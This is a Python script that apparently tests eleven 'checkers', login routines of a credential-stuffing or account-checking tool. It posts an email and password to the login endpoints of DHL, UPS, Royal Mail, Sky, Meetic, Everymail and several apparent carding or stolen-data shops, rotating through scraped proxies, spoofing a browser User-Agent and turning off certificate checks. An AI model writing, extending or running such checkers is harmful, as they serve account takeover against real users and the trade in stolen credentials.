#!/usr/bin/env python3
"""Test all checkers with scraped proxies"""
import requests
import random
import time
import warnings
from colorama import init, Fore

warnings.filterwarnings("ignore")
init(autoreset=True)

print(f"{Fore.CYAN}{'='*70}")
print(f"{Fore.GREEN}{'TESTING ALL 11 CHECKERS WITH SCRAPED PROXIES'.center(70)}")
print(f"{Fore.CYAN}{'='*70}\n")

# Load proxies
with open("proxy.txt") as f:
    proxies = [l.strip() for l in f if l.strip()]

print(f"{Fore.YELLOW}Loaded {len(proxies)} working proxies\n")

# Test credentials
email = "testuser123@gmail.com"
password = "TestPass123!"

ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"

def get_proxy():
    p = random.choice(proxies)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def test_site(name, test_func):
    print(f"{Fore.YELLOW}{name}")
    try:
        result = test_func()
        return result
    except requests.exceptions.ProxyError:
        print(f"  {Fore.RED}Proxy error - trying another...")
        try:
            result = test_func()
            return result
        except:
            print(f"  {Fore.RED}All proxies failed")
            return False
    except requests.exceptions.Timeout:
        print(f"  {Fore.RED}Timeout")
        return False
    except Exception as e:
        print(f"  {Fore.RED}Error: {str(e)[:50]}")
        return False

results = {}

# 1. Azyrah
def test_azyrah():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://shop.azyrah.to"}
    s.get("https://shop.azyrah.to/", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://shop.azyrah.to/auth/signin", json={"username": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 401, 403]
results["Azyrah"] = test_site("1. Azyrah (shop.azyrah.to)", test_azyrah)

# 2. Blstash  
def test_blstash():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json"}
    r = s.post("https://blstash.ws/api/auth/login", json={"username": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 401, 403, 500]
results["Blstash"] = test_site("2. Blstash (blstash.ws)", test_blstash)

# 3. DHL
def test_dhl():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded"}
    s.get("https://www.dhl.com/", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://api.dhl.com/mydhlapi/v2/oauth/token", data={"username": email, "password": password, "grant_type": "password"}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 400, 401, 403]
results["DHL"] = test_site("3. DHL (dhl.com)", test_dhl)

# 4. Easydeals
def test_easydeals():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://easydeals.gs"}
    s.get("https://easydeals.gs/login", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://easydeals.gs/api/auth/login", json={"username": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 401, 403]
results["Easydeals"] = test_site("4. Easydeals (easydeals.gs)", test_easydeals)

# 5. Everymail
def test_everymail():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded"}
    r = s.post("https://everymail.com/login", data={"email": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False, allow_redirects=True)
    print(f"  {Fore.GREEN}Status: {r.status_code} | URL: {r.url[:50]}...")
    return r.status_code in [200, 302, 401, 403]
results["Everymail"] = test_site("5. Everymail (everymail.com)", test_everymail)

# 6. Meetic
def test_meetic():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json", "Accept-Language": "fr-FR,fr"}
    s.get("https://www.meetic.fr/", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://www.meetic.fr/api/authentication/login", json={"email": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 400, 401, 403]
results["Meetic"] = test_site("6. Meetic (meetic.fr)", test_meetic)

# 7. RoyalMail
def test_royalmail():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json"}
    s.get("https://www.royalmail.com/", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://www.royalmail.com/api/v1/auth/login", json={"email": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 400, 401, 403, 404]
results["RoyalMail"] = test_site("7. RoyalMail (royalmail.com)", test_royalmail)

# 8. Savastan0
def test_savastan0():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://savastan0.tools"}
    s.get("https://savastan0.tools/login", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://savastan0.tools/api/auth/login", json={"username": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 401, 403]
results["Savastan0"] = test_site("8. Savastan0 (savastan0.tools)", test_savastan0)

# 9. Sky
def test_sky():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json"}
    s.get("https://www.sky.com/signin", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://skyid.sky.com/api/authenticate", json={"username": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 400, 401, 403]
results["Sky"] = test_site("9. Sky (sky.com)", test_sky)

# 10. Unitedshop
def test_unitedshop():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded"}
    s.get("https://unitedshop.su/login", headers=headers, proxies=proxy, timeout=10, verify=False)
    r = s.post("https://unitedshop.su/login", data={"username": email, "password": password}, headers=headers, proxies=proxy, timeout=10, verify=False, allow_redirects=True)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 302, 401, 403]
results["Unitedshop"] = test_site("10. Unitedshop (unitedshop.su)", test_unitedshop)

# 11. UPS
def test_ups():
    s = requests.Session()
    proxy = get_proxy()
    headers = {"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded"}
    s.get("https://www.ups.com/", headers=headers, proxies=proxy, timeout=12, verify=False)
    r = s.post("https://www.ups.com/lasso/signin", data={"userid": email, "password": password}, headers=headers, proxies=proxy, timeout=12, verify=False, allow_redirects=True)
    print(f"  {Fore.GREEN}Status: {r.status_code} | Response: {r.text[:80]}...")
    return r.status_code in [200, 302, 400, 401, 403]
results["UPS"] = test_site("11. UPS (ups.com)", test_ups)

# Summary
print(f"\n{Fore.CYAN}{'='*70}")
print(f"{Fore.GREEN}{'RESULTS SUMMARY'.center(70)}")
print(f"{Fore.CYAN}{'='*70}\n")

working = sum(1 for v in results.values() if v)
print(f"{Fore.GREEN}Working: {working}/11")
print(f"{Fore.RED}Failed: {11-working}/11\n")

for name, status in results.items():
    color = Fore.GREEN if status else Fore.RED
    symbol = "✓" if status else "✗"
    print(f"  {color}{symbol} {name}")
